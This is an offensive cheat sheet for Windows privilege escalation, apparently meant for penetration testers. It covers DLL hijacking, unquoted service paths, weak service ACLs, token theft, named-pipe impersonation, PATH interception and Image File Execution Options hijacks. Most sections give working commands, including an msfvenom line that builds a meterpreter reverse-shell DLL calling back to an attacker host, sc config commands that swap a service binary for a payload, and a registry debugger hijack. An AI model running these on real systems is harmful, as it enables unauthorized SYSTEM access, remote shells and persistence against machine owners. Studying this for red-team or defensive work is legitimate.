# Windows Privilege Escalation

## DLL Hijacking (T1038)
- Use Process Monitor to find missing DLL loads (NAME NOT FOUND) in privileged apps
- Place malicious DLL in writable directory that's searched before system dirs
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f dll > evil.dll`

## Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
# Exploit: drop binary at path break point (e.g., c:\program.exe)
# Restart service to trigger
sc stop VulnSvc & sc start VulnSvc
```

## Weak Service Permissions
```cmd
# Check service ACLs
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# Look for SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
# Reconfigure service binary path
sc config evilsvc binpath= "c:\payload.exe"
sc start evilsvc
```

## Access Token Manipulation (T1134)
- Steal token from privileged process using:
  `OpenProcess` -> `OpenProcessToken` -> `DuplicateTokenEx` -> `CreateProcessWithTokenW`
- Impersonate token of SYSTEM or Domain Admin processes

## Named Pipe Privilege Escalation
- Create named pipe server, trick privileged service into connecting
- Impersonate connecting client's token via `ImpersonateNamedPipeClient`
- Tools: PrintSpoofer, JuicyPotato, RottenPotato

## PATH Interception
- If writable directory precedes system32 in $PATH, drop malicious cmd.exe/powershell.exe
- Exploitable when SYSTEM-level software deployment calls common binaries

## Image File Execution Options (T1183)
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\targetapp.exe" /v Debugger /d "c:\payload.exe"
```
